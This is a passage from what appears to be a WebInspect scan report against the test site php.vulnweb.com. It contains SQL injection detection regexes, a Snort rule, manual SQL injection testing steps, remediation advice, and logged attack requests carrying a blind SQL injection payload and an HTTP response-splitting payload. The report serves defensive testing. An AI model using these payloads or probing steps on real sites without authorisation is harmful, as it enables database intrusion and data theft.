Regex for detection of SQL meta-characters:<br />
/(\%27)|(\')|(\-\-)|(\%23)|(#)/ix<br /><br />

The above regular expression would be added into a Snort rule as follows:<br /><br />

alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"SQL Injection
- Paranoid";
flow:to_server,established;uricontent:".pl";pcre:"/(\%27)|(\')|(\-\-)|(%23)|
(#)/i"; classtype:Web-application-attack; sid:9099; rev:5;)<br /><br />
	
Regex for typical SQL Injection attacks:<br />
/\w*((\%27)|(\'))((\%6F)|o|(\%4F))((\%72)|r|(\%52))/ix<br /><br />

Regex for detecting SQL Injection with the UNION keyword:<br />
/((\%27)|(\'))union/ix<br />
(\%27)|(\') <br />
the single-quote and its hex equivalent union - the keyword union<br /><br />

Similar expressions can be written for other SQL queries such as select, insert, update, delete, drop, and so on.<br /><br />

Regex for detecting SQL Injection attacks on a MS SQL Server:<br />
/exec(\s|\+)+(s|x)p\w+/ix

<br /><br /><b>






For QA: </b><br />

Fixes for SQL Injection defects will ultimately require code based fixes. The steps detailed in the Developer and Security Operations section will provide any developer with the information necessary to remediate these issues. The following steps outline how to manually test an application for SQL Injection. <br /><br /><b>

How to manually test applications for SQL Injection:</b><br />

1. Open the web application you wish to test for SQL Injection defects in a browser. <br /><br />

2. Mouse over the links of the Web site with your cursor while paying attention to the bottom status bar. You will notice the URLs that the links point to. Try to find a URL with parameters in it. Ex. http://www.site.com/articleid.asp?id=42. <br /><br />

Note: If you don't see any URL's in the status bar, then just click on links and watch the address bar until you find a URL that has parameters. <br /><br />

3. Once a URL with parameters has been found, click the link and go to that page. In the Address bar you should now see the URL that was seen in the status bar. <br /><br />

4. There are two methods for testing scripts for SQL injection. Be sure to test each parameter value one at a time with both methods. <br /><br /><b>Method 1.</b> Go to the address bar, click your cursor, and highlight a parameter value Ex. Highlight the word value in "name=value" and replace it with a single quote (').It should now look like "name=' " <br /><br /><b>Method 2. </b>Go to the address bar, click your cursor, and put a single quote (') in the middle of the value. It should now look like "name=val'ue" <br /><br />

5. Click the 'GO' button. This will send your request to the Web server. <br /><br />

6. Analyze the response from the Web server for any error messages. Most database error messages will look similar to the examples below: <br /><br /><b>Example error 1:</b><br />
Microsoft OLE DB Provider for SQL Server error '80040e14' <br />
Unclosed quotation mark before the character string '51 ORDER BY <br />
some_name'. /some_directory/some_file.asp, line 5 <br /><br /><b>Example error 2: </b><br />
ODBC Error Code = S1000 (General error) <br />
[Oracle][ODBC][Ora]ORA-00933: SQL command not properly ended <br /><br /><b>Example error 3: </b><br />
Error: 1353 SQLSTATE: HY000 (ER_VIEW_WRONG_LIST) <br />
Message: View's SELECT and view's field list have different column counts <br /><br />

7. Sometimes the error message is not obvious and is hidden in the source of the page. To look for it, you must view the HTML source of the page and search for the error. To do this in Internet Explorer, click the 'View' menu, and select the 'Source' option. This will cause notepad to open with the HTML source of the page. In notepad, click the 'Edit' menu and select 'Find'. A dialog box will appear that will ask you to 'Find What'. Type the phrase 'Microsoft OLE DB' or '[ODBC]' and click 'Find Next'. <br /><br />

8. If either step 6 or 7 is successful, then the Web site is vulnerable to SQL injection.<br />]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br />

Microsoft<br /><a href="http://msdn.microsoft.com/msdnmag/issues/04/09/SQLInjection/default.aspx">http://msdn.microsoft.com/msdnmag/issues/04/09/SQLInjection/default.aspx</a><br /><a href="http://support.microsoft.com/default.aspx?scid=kb;en-us;302570">http://support.microsoft.com/default.aspx?scid=kb;en-us;302570</a><br /><br />

SQLSecurity.com<br /><a href="http://www.sqlsecurity.com/DesktopDefault.aspx">http://www.sqlsecurity.com/DesktopDefault.aspx</a><br /><br />

OWASP<br /><a href="http://www.owasp.org/index.php/SQL_Injection">http://www.owasp.org/index.php/SQL_Injection</a><br />]]></SectionText></ReportSection></Issue></Issues><RawRequest id="9E187A97669FE40743417D8CB336DAB3"><![CDATA[POST /AJAX/infotitle.php HTTP/1.1
Referer: http://php.vulnweb.com/AJAX/index.php
Host: php.vulnweb.com
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
content-type: application/x-www-form-urlencoded
Content-Length: 75
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="9E187A97669FE40743417D8CB336DAB3";PSID="CD6AE2AAEA951B3E1FA12B842A3E9C59";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="9722923f-f8d3-49c2-90bd-7c0e15901c18";AttackSequence="72";AttackParamDesc="id";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5657";Engine="Sql+Injection";SmartMode="4";AttackString="1%2509AND%2509(select%2509ASCII(SUBSTR(schema()%252c7%252c1)))%2509%253c0%2509Or%25093%253d6";AttackStringProps="Attack";tid="41";tt="40";
X-RequestManager-Memo: sid="31";smi="0";sc="1";ID="df37def5";
X-Request-Memo: ID="4a925811";sc="1";tid="41";
Cookie: CustomCookie=WebInspect0

id=1%09AND%09(select%09ASCII(SUBSTR(schema()%2c7%2c1)))%09%3c0%09Or%093%3d6]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:47:57 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/xml;charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 21

<iteminfo></iteminfo>]]></RawResponse><Request id="9E187A97669FE40743417D8CB336DAB3"><Method>POST</Method><Path>/AJAX/</Path><File>infotitle</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData>id=1%09AND%09(select%09ASCII(SUBSTR(schema()%2c7%2c1)))%09%3c0%09Or%093%3d6</FullPostData><XMLPostData /><MultiPartPostData /><RawASCIIPostData /><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/AJAX/index.php</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Accept-Language</Name><Value>en-US,en;q=0.5</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>content-type</Name><Value>application/x-www-form-urlencoded</Value></Header><Header><Name>Content-Length</Name><Value>75</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="9E187A97669FE40743417D8CB336DAB3";PSID="CD6AE2AAEA951B3E1FA12B842A3E9C59";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="9722923f-f8d3-49c2-90bd-7c0e15901c18";AttackSequence="72";AttackParamDesc="id";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5657";Engine="Sql+Injection";SmartMode="4";AttackString="1%2509AND%2509(select%2509ASCII(SUBSTR(schema()%252c7%252c1)))%2509%253c0%2509Or%25093%253d6";AttackStringProps="Attack";tid="41";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="31";smi="0";sc="1";ID="df37def5";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="4a925811";sc="1";tid="41";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<iteminfo></iteminfo>]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:47:57 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/xml;charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>21</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="A87C1AD1A69B0E6A61197523CFDC3FCF"><URL>http://php.vulnweb.com:80/Mod_Rewrite_Shop/images/</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="A87C1AD1A69B0E6A61197523CFDC3FCF"><![CDATA[GET /Mod_Rewrite_Shop/images/ HTTP/1.1
Referer: http://php.vulnweb.com/Mod_Rewrite_Shop/images/2.jpg
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="A87C1AD1A69B0E6A61197523CFDC3FCF";PSID="359BF09B752194B36180F082F3397125";SessionType="PathTruncation";CrawlType="None";AttackType="None";OriginatingEngineID="398bfe9e-1b77-4458-9691-603eea06e341";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="0";Engine="Path+Truncation";SmartMode="4";tid="59";tt="11";
X-RequestManager-Memo: sid="39";smi="0";sc="1";ID="1a9241e8";
X-Request-Memo: ID="ad400d7a";sc="1";tid="45";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:48:04 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html
Content-Length: 513

<html>
<head><title>Index of /Mod_Rewrite_Shop/images/</title></head>
<body>
<h1>Index of /Mod_Rewrite_Shop/images/</h1><hr><pre><a href="../">../</a>
<a href="1.jpg">1.jpg</a>                                              15-Feb-2012 08:33                3551
<a href="2.jpg">2.jpg</a>                                              15-Feb-2012 08:27                2739
<a href="3.jpg">3.jpg</a>                                              15-Feb-2012 08:28                3560
</pre><hr></body>
</html>
]]></RawResponse><Request id="A87C1AD1A69B0E6A61197523CFDC3FCF"><Method>GET</Method><Path>/Mod_Rewrite_Shop/images/</Path><File /><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/Mod_Rewrite_Shop/images/2.jpg</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="A87C1AD1A69B0E6A61197523CFDC3FCF";PSID="359BF09B752194B36180F082F3397125";SessionType="PathTruncation";CrawlType="None";AttackType="None";OriginatingEngineID="398bfe9e-1b77-4458-9691-603eea06e341";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="0";Engine="Path+Truncation";SmartMode="4";tid="59";tt="11";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="39";smi="0";sc="1";ID="1a9241e8";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="ad400d7a";sc="1";tid="45";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<html>
<head><title>Index of /Mod_Rewrite_Shop/images/</title></head>
<body>
<h1>Index of /Mod_Rewrite_Shop/images/</h1><hr><pre><a href="../">../</a>
<a href="1.jpg">1.jpg</a>                                              15-Feb-2012 08:33                3551
<a href="2.jpg">2.jpg</a>                                              15-Feb-2012 08:27                2739
<a href="3.jpg">3.jpg</a>                                              15-Feb-2012 08:28                3560
</pre><hr></body>
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:48:04 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html</Value></Header><Header><Name>Content-Length</Name><Value>513</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="C377375B350E277BB7FAB230615F4FEF"><URL>http://php.vulnweb.com:80/listproducts.php?artist=2%0d%0aSPIHeader:%20SPIValue</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor>artist</AttackParamDescriptor><Issues><Issue id="919d5ce2-7b5c-4b99-aff3-22886500fa14"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>10026</EngineType><AttackHTTPRequest /><VulnerabilityID>742</VulnerabilityID><Severity>4</Severity><Name>Database Server Error Message</Name><Classifications><Classification kind="CWE" identifier="CWE-209" href="http://cwe.mitre.org/data/definitions/209.html">CWE-209: Information Exposure Through an Error Message</Classification><Classification kind="7PK" identifier="Errors" href="https://vulncat.fortify.com/">Errors</Classification><Classification kind="7PK Category" identifier="Poor Error Handling: Unhandled Exception" href="https://vulncat.fortify.com/">Poor Error Handling: Unhandled Exception</Classification></Classifications><DetectionSelection><Location offset="2287" length="24" /><Location offset="2355" length="20" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[Critical database server error message vulnerabilities were identified in the web application, indicating that an unhandled exception was generated in your web application code. Unhandled exceptions are circumstances in which the application has received user input that it did not expect and does not know how to handle. When successfully exploited, an attacker can gain unauthorized  access to the database by using the information recovered from seemingly innocuous error messages to pinpoint flaws in the web application and to discover additional avenues of attack. Recommendations include designing and adding consistent error-handling mechanisms that are capable of handling any user input  to your web application, providing meaningful detail to end-users, and preventing error messages that might provide information useful to an attacker from being displayed. 

<br /><br /><b>Description</b><br /><br />


The most common cause of an unhandled exception is a failure to properly sanitize client-supplied data that is used in SQL statements. They can also be caused by a bug in the web application's database communication code, a misconfiguration of database connection settings, an unavailable database, or any other reason that would cause the application's database driver to be unable to establish a working session with the server. The problem is not that web applications generate errors.  All web applications in their normal course of operation will at some point receive an unhandled exception.  The problem lies not in that these errors were received, but rather in how they are handled. Any error handling solution needs to be well-designed, and uniform in how it handles errors.  For instance, assume an attacker is attempting to access a specific file. If the request returns an error File not Found, the attacker can be relatively sure the file does not exist.  However, if the error returns "Permission Denied," the attacker has a fairly good idea that the specific file does exist. This can be helpful to an attacker in many ways, from determining the operating system to discovering the underlying architecture and design of the application.

<br /><br />

The error message may also contain the location of the file that contains the offending function. This may disclose the webroot's absolute path as well as give  the attacker the location of application "include" files or database configuration information. A fundamental necessity for a successful attack upon your web application is reconnaissance. Database server error messages can provide information that can then be utilized when the attacker is formulating his next method of attack. It may even disclose the portion of code that failed.  

<br /><br />

Be aware that this check is part of unknown application testing which seeks to uncover new vulnerabilities in both custom and commercial software. Because of this, there are no specific patches or remediation information for this issue.  Please note that this vulnerability may be a false positive if the page it is flagged on is technical documentation relating to a database server.

]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />The severity of this vulnerability depends on the reason that the error message was generated.  In most cases, it will be the result of the web application 

attempting to use an invalid client-supplied argument in a SQL statement, which means that SQL injection will be possible. If so, an attacker will at least be able to read the contents of the entire database arbitrarily. Depending on the database server and the SQL statement, deleting, updating and adding records and executing arbitrary commands may also be possible. If a software bug or bug is responsible for triggering the error, the potential impact will vary, depending on the 

circumstances. 

The location of the application that caused the error can be useful in facilitating other kinds of attacks. If the file is a hidden or include file, the attacker may be able to gain more information about the mechanics of the web application, possibly even the source code. Application source code is likely to contain usernames, passwords, database connection strings and aids the attacker greatly in discovering new vulnerabilities.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />
The information gleaned from database server error messages allows an attacker to conduct a successful attack after he combines his various findings. You can verify the database error response is highlighted in response tab. The ways in which an attacker can exploit the conditions that caused the error depend on its cause. In the case of SQL injection, the techniques that are used will vary from database server to database server, and even query to query. An overview SQL Injection attacks is available in the SQL Injection vulnerability information, accessible via the Policy Manager.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development: </b><br /><br />
From a development perspective, the best method of preventing problems from arising from database error messages is to adopt secure programming techniques that prevent problems that might arise from an attacker discovering too much information about the architecture and design of your web application. The following recommendations can be used as a basis for that. 


<ul><li>
Stringently define the data type (for instance, a string, an alphanumeric character, etc) that the application will accept. </li><li>Use what is good instead of what is bad. Validate input for improper characters. </li><li>Do not display error messages to the end user that provide information (such as table names) that could be utilized in orchestrating an attack. </li><li>Define the allowed set of characters. For instance, if a field is to receive a number, only let that field accept numbers. </li><li>Define the maximum and minimum data lengths for what the application will accept. </li><li>Specify acceptable numeric ranges for input.</li></ul><b>For Security Operations: </b><br /><br />
The following recommendations will help in implementing a secure database protocol for your web application.   Be advised each database has its own method of  
secure lock down. <br /><br /><ul><li><b> ODBC Error Messaging:  </b>Turn off ODBC error messaging in your database server. Never display raw ODBC or other errors to the end user.  See Removing Detailed Error Messages below, or consult your database server's documentation, for more information. 


  </li><br /><li><b>Uniform Error Codes: </b> Ensure that you are not inadvertently supplying information to an attacker via the use of inconsistent or "conflicting" error  
messages.  For instance, don't reveal unintended information by utilizing error messages such as Access Denied, which will also let an attacker know that the file  
he seeks actually exists.  Have consistent terminology for files and folders that do exist, do not exist, and which have read access denied.  </li><br /><li><b>Informational Error Messages: </b> Ensure that error messages do not reveal too much information.  Complete or partial paths, variable and file names,  
row and column names in tables, and specific database errors should never be revealed to the end user. Remember, an attacker will gather as much information  
as possible, and then add pieces of seemingly innocuous information together to craft a method of attack.</li><br /><li><b>Proper Error Handling: </b> Utilize generic error pages and error handling logic to inform end users of potential problems. Do not provide system  
information or other data that could be utilized by an attacker when orchestrating an attack. </li><br /><li><b>Stored Procedures: </b> Consider using stored procedures. They require a very specific parameter format, which makes them less susceptible to SQL Injection  
attacks.  </li><br /><li><b>Database Privileges:  </b>  Utilize a least-privileges scheme for the database application.  Ensure that user accounts only have the limited functionality  
that is actually required.  All database mechanisms should deny access until it has been granted, not grant access until it has been denied. </li><br /></ul><br /><br /><b>For QA: </b><br /><br />

In reality, simple testing can usually determine how your web application will react to different input errors.  More expansive testing must be conducted to cause internal errors to gauge the reaction of the site. If the unhandled exception occurs in a piece of in-house developed software, consult the developer. If it is in a commercial package, contact technical support.<br /><br />


The best course of action for QA associates to take is to ensure that the error handling scheme is consistent.  Do you receive a different type of error for a file that does not exist as opposed to a file that does? Are phrases like "Permission Denied" utilized which could reveal the existence of a file to an attacker?]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>Apache:</b><br /><a href="http://httpd.apache.org/docs/1.3/custom-error.html">Apache HTTP Server Version 1.3 Custom Error Responses</a><br /><a href="http://httpd.apache.org/docs/2.0/custom-error.html">Apache HTTP Server Version 2.0 Custom Error Responses</a><br /><br /><b>Microsoft:</b><br /><a href="http://support.microsoft.com/kb/318380">Description of Microsoft Internet Information Services (IIS) 5.0 and 6.0 status codes</a><br /><a href="https://vulncat.fortify.com/en/weakness?q=SQL%20Injection">SQL Injection</a>]]></SectionText></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[The most common cause of an unhandled exception is a failure to properly sanitize client-supplied data that is used in SQL statements. They can also be caused by a bug in the web application's database communication code, a misconfiguration of database connection settings, an unavailable database, or any other reason that would cause the application's database driver to be unable to establish a working session with the server. The problem is not that web applications generate errors. All web applications in their normal course of operation will at some point receive an unhandled exception. The problem lies not in that these errors were received, but rather in how they are handled. Any error handling solution needs to be well-designed, and uniform in how it handles errors. For instance, assume an attacker is attempting to access a specific file. If the request returns an error File not Found, the attacker can be relatively sure the file does not exist. However, if the error returns "Permission Denied," the attacker has a fairly good idea that the specific file does exist. This can be helpful to an attacker in many ways, from determining the operating system to discovering the underlying architecture and design of the application. <br /><br />
The error message may also contain the location of the file that contains the offending function. This may disclose the webroot's absolute path as well as give the attacker the location of application "include" files or database configuration information. A fundamental necessity for a successful attack upon your web application is reconnaissance. Database server error messages can provide information that can then be utilized when the attacker is formulating his next method of attack. It may even disclose the portion of code that failed.<br /><br />
Please note that this vulnerability may be a false positive if the page it is flagged on is technical documentation relating to a database server.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[The severity of this vulnerability depends on the reason the error message was generated. In most cases, it will be the result of the web application attempting to use an invalid client-supplied argument in a SQL statement, which means that SQL injection will be possible. If so, an attacker will at least be able to read the contents of the entire database arbitrarily. Depending on the database server and the SQL statement, deleting, updating and adding records and executing arbitrary commands may also be possible. If a software bug is responsible for triggering the error, the potential impact will vary, depending on the circumstances. The location of the application that caused the error can be useful in facilitating other kinds of attacks. If the file is a hidden or include file, the attacker may be able to gain more information about the mechanics of the web application, possibly even the source code. Application source code is likely to contain usernames, passwords, database connection strings and aids the attacker greatly in discovering new vulnerabilities.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[The Probability Score ranks the likelihood of an attack when all factors of potential success are taken into consideration, such as the amount of expertise necessary to exploit the vulnerability, its ease of exploitation, and what mitigating factors could potentially increase or decrease its rate of success.  For instance, does this attack rely on acquiring other information or gaining specific access to be successful, or can it be exploited by itself?  Are there automated attack tools that can increase its effectiveness, such as with SQL Injection?  Is the vulnerability hard to find, ala a buffer overflow?  Are similar exploits well publicized?]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed immediately.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[Custom error messages can be disabled via the ASP.NET Web Site Administration Tool.  Choose Website | ASP.NET Configuration from the Visual Studio 2005 menu to display it.  Then select the Application tab and click on “Define default error page”.  Select “Specify a URL” and choose a page within your project in the tree control.
<br /><br />
The corresponding elements of web.config are shown below.  The attribute “mode” should never be set to “Off”. Instead, choose “On” to always use custom errors or “RemoteOnly” to allow diagnosis of issues from the web server console.<br /><br />
&lt;configuration&gt;<br />
    &lt;system.web&gt;<br />
        &lt;customErrors mode="RemoteOnly" defaultRedirect="GenericErrorPage.htm"&gt;<br />
        &lt;/customErrors&gt;<br />
    &lt;/system.web&gt;<br />
&lt;/configuration&gt;
<br /><br />The attribute “defaultRedirect” should contain the relative URL of an error page.<br /><br />
Consult MSDN for additional options within this element.  For instance, you can specify different error pages based on the HTTP error code, such as 404 “Not Found”.<br /><br />

The best method of preventing problems that might arise from error messages is to adopt secure programming techniques that prevent an attacker from discovering too much information about the architecture and design of your web application. The following recommendations can be used as a basis for that. <br /><br /><ul><li>Stringently define the data type (for instance, a string, an alphanumeric character, etc) that the application will accept. </li><li>Use what is good instead of what is bad. Validate input for improper characters. </li><li>Do not display error messages to the end user that provide information (such as table names) that could be utilized in orchestrating an attack. </li><li>Define the allowed set of characters. For instance, if a field is to receive a number, only let that field accept numbers. </li><li>Define the maximum and minimum data lengths for what the application will accept. </li><li>Specify acceptable numeric ranges for input </li></ul>Also, be sure that you have a consistent error handling mechanism that includes consideration of the following elements: <br /><br /><ul><li><b>Uniform Error Codes: </b>Ensure that you are not inadvertently supplying information to an attacker via the use of inconsistent or "conflicting" error messages. For instance, don't reveal unintended information by utilizing error messages such as Access Denied, which will also let an attacker know that the file he seeks actually exists. Have consistent terminology for files and folders that do exist, do not exist, and which have read access denied. </li><li><b>Informational Error Messages: </b>Ensure that error messages do not reveal too much information. Complete or partial paths, variable and file names, row and column names in tables, and specific database errors should never be revealed to the end user. Remember, an attacker will gather as much information as possible, and then add pieces of seemingly innocuous information together to craft a method of attack.</li><li><b>Proper Error Handling: </b>Utilize generic error pages and error handling logic to inform end users of potential problems. Do not provide system information or other data that could be utilized by an attacker when orchestrating an attack.</li></ul>]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />
Custom error messages should be enabled in the deployment descriptor file for the Java 2 Platform, Enterprise Edition (J2EE) Web application. The “error-page” element of web.xml specifies a mapping between an error code or exception type to the path of an error page resource in the Web application. <br /><br />
The following example shows how a SQL Exception can be mapped to a custom general-error page called “errorPage.jsp” in web.xml: <br /><br />
&lt;error-page&gt;<br />
  &lt;exception-type&gt;java.lang.SQLException&lt;/exception-type&gt;<br />
  &lt;location&gt;/errorPage.jsp&lt;/location&gt;<br />
&lt;/error-page&gt;<br /><br />
The following example shows how an HTTP error code can be mapped to custom general error page called “errorPage.jsp” in web.xml: <br /><br />
&lt;error-page&gt;<br />
  &lt;error-code&gt;404&lt;/error-code&gt;<br />
  &lt;location&gt;/errorPage.jsp&lt;/location&gt;<br />
&lt;/error-page&gt;<br /><br />
To handle runtime exceptions within a JSP page, each page should specify a custom error page in page directive as shown below: <br /><br />
&lt;%@ page errorPage="errorPage.jsp" %&gt;<br /><br />
Within a Java servlet code, you can catch a SQL exception, throw a new generic exception, and forward the request to the error page to show a generic exception as shown below: <br /><br />
request.setAttribute("javax.servlet.jsp.jspException", new <br />
  Exception("Generic Error Message"));<br />
RequestDispatcher rd = <br />
  getServletContext().getRequestDispatcher("/errorPage.jsp");<br />
rd.forward(request, response); <br /><br />
The best method of preventing problems that arise from error messages is to adopt secure programming techniques that prevent an attacker from discovering too much information about the architecture and design of your Web application. The following recommendations can be used as a basis for that. 
<ul><li>Stringently define the data type (a string, an alphanumeric character, etc) that the application will accept. </li><li>Use what is good instead of what is bad. Validate input for improper characters. </li><li>Do not display error messages to the end user that provide information (such as table names) that could be used in orchestrating an attack. </li><li>Define the allowed set of characters. For instance, if a field is to receive a number, allow that field to accept only numbers. </li><li>Define the maximum and minimum data lengths that the application will accept. </li><li>Specify acceptable numeric ranges for input </li></ul>
Also, be sure that you have a consistent error-handling mechanism that includes the following elements: 
<ul><li><b>Uniform Error Codes:</b> Ensure that you are not inadvertently supplying information to an attacker via the use of inconsistent or "conflicting" error messages. For instance, don't reveal unintended information by utilizing error messages such as Access Denied, which will also let an attacker know that the file he seeks actually exists. Have consistent terminology for files and folders that do exist, do not exist, and which have read access denied. </li><li><b>Informational Error Messages:</b> Ensure that error messages do not reveal too much information. Complete or partial paths, variable and file names, row and column names in tables, and specific database errors should never be revealed to the end user. Remember, an attacker will gather as much information as possible, and then add pieces of seemingly innocuous information together to craft a method of attack. </li><li><b>Proper Error Handling:</b> Use generic error pages and error handling logic to inform end users of potential problems. Do not provide system information or other data that could be used by an attacker when orchestrating an attack. </li></ul>]]></SectionText></ReportSection></Issue></Issues><RawRequest id="C377375B350E277BB7FAB230615F4FEF"><![CDATA[GET /listproducts.php?artist=2%0d%0aSPIHeader:%20SPIValue HTTP/1.1
Referer: http://php.vulnweb.com/artists.php?artist=2
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="C377375B350E277BB7FAB230615F4FEF";PSID="576BAD0E7F0040BE9A90FAB7AD0E6559";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="90e84d4b-fe51-47a6-ace4-be01fbb9325c";AttackSequence="0";AttackParamDesc="artist";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="3582";Engine="Http+Response+Splitting";SmartMode="4";AttackString="2%250d%250aSPIHeader%3a%2520SPIValue";AttackStringProps="Attack";tid="84";tt="11";
X-RequestManager-Memo: sid="41";smi="0";sc="1";ID="d8e5ee99";
X-Request-Memo: ID="375a5092";sc="1";tid="46";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:48:14 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
